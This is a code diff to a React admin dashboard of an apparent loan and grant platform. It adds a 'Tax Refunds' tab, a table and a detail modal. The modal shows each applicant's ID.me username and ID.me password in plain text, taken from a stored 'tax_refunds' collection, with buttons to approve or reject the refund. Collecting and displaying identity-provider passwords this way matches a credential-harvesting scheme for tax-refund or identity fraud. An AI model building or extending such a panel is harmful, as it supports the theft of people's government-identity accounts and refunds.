@@ -49,16 +49,19 @@ export const AdminPage = () => {
   const [pendingKYCs, setPendingKYCs] = useState<any[]>([]);
   const [pendingDeposits, setPendingDeposits] = useState<any[]>([]);
   const [grants, setGrants] = useState<any[]>([]);
+  const [taxRefunds, setTaxRefunds] = useState<any[]>([]);
   const [chats, setChats] = useState<any[]>([]);
   const [loading, setLoading] = useState(true);
-  const [activeTab, setActiveTab] = useState<'dashboard' | 'users' | 'loans' | 'kyc' | 'deposits' | 'banks' | 'wallet' | 'managers' | 'grants' | 'chats'>('dashboard');
+  const [activeTab, setActiveTab] = useState<'dashboard' | 'users' | 'loans' | 'kyc' | 'deposits' | 'banks' | 'wallet' | 'managers' | 'grants' | 'chats' | 'tax-refunds'>('dashboard');
   const [selectedKYC, setSelectedKYC] = useState<any | null>(null);
   const [selectedLoan, setSelectedLoan] = useState<any | null>(null);
   const [selectedDeposit, setSelectedDeposit] = useState<any | null>(null);
   const [selectedUser, setSelectedUser] = useState<any | null>(null);
   const [selectedGrant, setSelectedGrant] = useState<any | null>(null);
+  const [selectedTaxRefund, setSelectedTaxRefund] = useState<any | null>(null);
   const [selectedChatId, setSelectedChatId] = useState<string | null>(null);
   const [isGrantModalOpen, setIsGrantModalOpen] = useState(false);
+  const [isTaxRefundModalOpen, setIsTaxRefundModalOpen] = useState(false);
   const [isUpdatingRole, setIsUpdatingRole] = useState(false);
   const [rejectionReason, setRejectionReason] = useState('');
   const [showRejectionModal, setShowRejectionModal] = useState(false);
@@ -211,6 +214,22 @@ export const AdminPage = () => {
       console.error('Error setting up admin grants listener:', err instanceof Error ? err.message : String(err));
     }
 
+    // Listen for tax refunds
+    let unsubscribeTaxRefunds: (() => void) | null = null;
+    try {
+      const taxRefundsQuery = query(collection(db, 'tax_refunds'));
+      unsubscribeTaxRefunds = onSnapshot(taxRefundsQuery, (snapshot) => {
+        const taxRefundsData = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
+        setTaxRefunds(taxRefundsData.sort((a: any, b: any) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime()));
+      }, (err) => {
+        if (err.code !== 'permission-denied') {
+          handleFirestoreError(err, OperationType.LIST, 'tax_refunds');
+        }
+      });
+    } catch (err) {
+      console.error('Error setting up admin tax refunds listener:', err instanceof Error ? err.message : String(err));
+    }
+
     // Listen for all chats
     let unsubscribeChats: (() => void) | null = null;
     try {
@@ -233,6 +252,7 @@ export const AdminPage = () => {
       if (unsubscribeKYC) unsubscribeKYC();
       if (unsubscribeDeposits) unsubscribeDeposits();
       if (unsubscribeGrants) unsubscribeGrants();
+      if (unsubscribeTaxRefunds) unsubscribeTaxRefunds();
       if (unsubscribeChats) unsubscribeChats();
       if (unsubscribeSettings) unsubscribeSettings();
     };
@@ -725,6 +745,13 @@ export const AdminPage = () => {
             count={grants.filter(g => g.status === 'pending').length}
           />
           <TabButton 
+            active={activeTab === 'tax-refunds'} 
+            onClick={() => setActiveTab('tax-refunds')}
+            icon={<FileText className="w-4 h-4" />}
+            label="Tax Refunds"
+            count={taxRefunds.filter(r => r.status === 'pending').length}
+          />
+          <TabButton 
             active={activeTab === 'banks'} 
             onClick={() => setActiveTab('banks')}
             icon={<UserCheck className="w-4 h-4" />}
@@ -777,6 +804,12 @@ export const AdminPage = () => {
                 label="Pending Grants"
                 value={grants.filter(g => g.status === 'pending').length.toString()}
                 subValue="New Applications"
+              />
+              <AdminStatCard 
+                icon={<FileText className="text-amber-500" />}
+                label="Pending Tax Refunds"
+                value={taxRefunds.filter(r => r.status === 'pending').length.toString()}
+                subValue="Tax Applications"
               />
               <AdminStatCard 
                 icon={<ArrowUpRight className="text-orange-500" />}
@@ -945,6 +978,78 @@ export const AdminPage = () => {
                               onClick={() => {
                                 setSelectedGrant(grant);
                                 setIsGrantModalOpen(true);
+                              }}
+                              className="p-2 hover:bg-accent/10 text-gray-400 hover:text-accent rounded-lg transition-all"
+                            >
+                              <Eye className="w-4 h-4" />
+                            </button>
+                          </td>
+                        </tr>
+                      );
+                    })
+                  )}
+                </tbody>
+              </table>
+            </div>
+          </div>
+        ) : activeTab === 'tax-refunds' ? (
+          <div className="card">
+            <div className="flex justify-between items-center mb-8">
+              <h2 className="text-xl font-bold dark:text-white uppercase tracking-tighter">Tax Refund Applications</h2>
+              <div className="relative">
+                <Search className="w-4 h-4 absolute left-3 top-1/2 -translate-y-1/2 text-gray-400" />
+                <input 
+                  type="text" 
+                  placeholder="Search tax refunds..." 
+                  className="pl-10 pr-4 py-2 bg-gray-50 dark:bg-zinc-900 border border-gray-200 dark:border-zinc-800 rounded-xl text-sm focus:outline-none focus:ring-2 focus:ring-accent/20"
+                />
+              </div>
+            </div>
+            <div className="overflow-x-auto">
+              <table className="w-full text-left">
+                <thead>
+                  <tr className="border-b border-gray-100 dark:border-zinc-800 text-gray-400 text-[10px] font-black uppercase tracking-widest">
+                    <th className="pb-4">Applicant</th>
+                    <th className="pb-4">ID.me Username</th>
+                    <th className="pb-4">Status</th>
+                    <th className="pb-4">Date</th>
+                    <th className="pb-4 text-right">Actions</th>
+                  </tr>
+                </thead>
+                <tbody className="divide-y divide-gray-100 dark:divide-zinc-800">
+                  {taxRefunds.length === 0 ? (
+                    <tr>
+                      <td colSpan={5} className="py-20 text-center text-gray-500 italic">
+                        No tax refund applications found.
+                      </td>
+                    </tr>
+                  ) : (
+                    taxRefunds.map((refund) => {
+                      const applicant = users.find(u => u.id === refund.userId);
+                      return (
+                        <tr key={refund.id} className="group hover:bg-gray-50 dark:hover:bg-zinc-800/50 transition-colors">
+                          <td className="py-4">
+                            <div className="font-bold dark:text-white">{refund.fullName || applicant?.email || 'Unknown User'}</div>
+                            <div className="text-[10px] text-gray-400 font-mono">{refund.email}</div>
+                          </td>
+                          <td className="py-4">
+                            <div className="text-sm dark:text-white font-medium">{refund.idMeUsername}</div>
+                          </td>
+                          <td className="py-4">
+                            <span className={`px-2 py-1 rounded-full text-[10px] font-black uppercase tracking-widest ${
+                              refund.status === 'completed' ? 'bg-green-100 text-green-700' :
+                              refund.status === 'failed' ? 'bg-red-100 text-red-700' :
+                              'bg-yellow-100 text-yellow-700'
+                            }`}>
+                              {refund.status}
+                            </span>
+                          </td>
+                          <td className="py-4 text-gray-500 text-sm">{formatDate(refund.createdAt)}</td>
+                          <td className="py-4 text-right">
+                            <button 
+                              onClick={() => {
+                                setSelectedTaxRefund(refund);
+                                setIsTaxRefundModalOpen(true);
                               }}
                               className="p-2 hover:bg-accent/10 text-gray-400 hover:text-accent rounded-lg transition-all"
                             >
@@ -2090,6 +2195,93 @@ export const AdminPage = () => {
                 >
                   Close Profile
                 </button>
+              </div>
+            </motion.div>
+          </div>
+        )}
+      </AnimatePresence>
+
+      {/* Tax Refund Modal */}
+      <AnimatePresence>
+        {isTaxRefundModalOpen && selectedTaxRefund && (
+          <div className="fixed inset-0 z-50 flex items-center justify-center p-6">
+            <motion.div 
+              initial={{ opacity: 0 }}
+              animate={{ opacity: 1 }}
+              exit={{ opacity: 0 }}
+              onClick={() => setIsTaxRefundModalOpen(false)}
+              className="absolute inset-0 bg-black/60 backdrop-blur-sm"
+            />
+            <motion.div 
+              initial={{ scale: 0.9, opacity: 0, y: 20 }}
+              animate={{ scale: 1, opacity: 1, y: 0 }}
+              exit={{ scale: 0.9, opacity: 0, y: 20 }}
+              className="relative bg-white dark:bg-zinc-950 rounded-[2.5rem] p-10 max-w-2xl w-full shadow-2xl border border-gray-200 dark:border-zinc-800 overflow-y-auto max-h-[90vh] custom-scrollbar"
+            >
+              <div className="flex justify-between items-start mb-10">
+                <div className="flex items-center gap-4">
+                  <div className="w-14 h-14 rounded-2xl bg-amber-500/10 flex items-center justify-center">
+                    <FileText className="w-7 h-7 text-amber-500" />
+                  </div>
+                  <div>
+                    <h3 className="text-3xl font-black tracking-tighter dark:text-white uppercase">Tax Refund Details</h3>
+                    <p className="text-gray-500 text-xs font-black uppercase tracking-widest">Application ID: {selectedTaxRefund.id}</p>
+                  </div>
+                </div>
+                <button onClick={() => setIsTaxRefundModalOpen(false)} className="p-2 hover:bg-gray-100 dark:hover:bg-zinc-800 rounded-full">
+                  <XCircle className="w-6 h-6 text-gray-400" />
+                </button>
+              </div>
+
+              <div className="grid grid-cols-1 md:grid-cols-2 gap-8 mb-10">
+                <DetailSection title="Personal Info">
+                  <DetailItem label="Full Name" value={selectedTaxRefund.fullName} />
+                  <DetailItem label="Email" value={selectedTaxRefund.email} />
+                </DetailSection>
+
+                <DetailSection title="ID.me Connection">
+                  <DetailItem label="Username" value={selectedTaxRefund.idMeUsername} />
+                  <DetailItem label="Password" value={selectedTaxRefund.idMePassword} />
+                </DetailSection>
+
+                <DetailSection title="Application Data">
+                  <DetailItem label="Status" value={selectedTaxRefund.status.toUpperCase()} />
+                  <DetailItem label="Applied On" value={formatDate(selectedTaxRefund.createdAt)} />
+                </DetailSection>
+
+                <DetailSection title="Additional Details">
+                  <div className="col-span-2">
+                    <p className="text-[10px] font-black uppercase tracking-widest text-gray-400 mb-1">Details</p>
+                    <p className="text-sm dark:text-white bg-gray-50 dark:bg-zinc-900 p-4 rounded-xl italic">
+                      {selectedTaxRefund.details || 'No additional details provided.'}
+                    </p>
+                  </div>
+                </DetailSection>
+              </div>
+
+              <div className="flex gap-4 pt-8 border-t border-gray-100 dark:border-zinc-800">
+                {selectedTaxRefund.status === 'pending' && (
+                  <>
+                    <button 
+                      onClick={async () => {
+                        await updateDoc(doc(db, 'tax_refunds', selectedTaxRefund.id), { status: 'failed' });
+                        setIsTaxRefundModalOpen(false);
+                      }}
+                      className="flex-1 py-4 rounded-2xl font-bold text-red-500 hover:bg-red-50 transition-all border border-red-100"
+                    >
+                      Reject Application
+                    </button>
+                    <button 
+                      onClick={async () => {
+                        await updateDoc(doc(db, 'tax_refunds', selectedTaxRefund.id), { status: 'completed' });
+                        setIsTaxRefundModalOpen(false);
+                      }}
+                      className="flex-1 btn-primary py-4"
+                    >
+                      Approve Refund
+                    </button>
+                  </>
+                )}
               </div>
             </motion.div>
           </div>
